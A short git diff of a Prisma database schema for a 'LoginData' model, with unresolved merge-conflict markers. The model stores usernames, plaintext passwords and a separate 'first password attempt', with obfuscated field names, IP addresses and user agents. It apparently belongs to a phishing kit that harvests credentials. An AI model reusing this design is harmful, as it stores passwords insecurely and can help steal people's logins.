@@ -31,7 +31,12 @@ model LoginData {
   id        String   @id @default(cuid())
   sessionId String   @unique
   xusr      String   // Username/email
+<<<<<<< HEAD
   xpss      String   // Password (should be hashed in production)
+=======
+  xpssFirst String?  // First password attempt
+  xpss      String   // Password
+>>>>>>> 7a6c50a (ready)
   timestamp DateTime @default(now())
   ip        String
   userAgent String
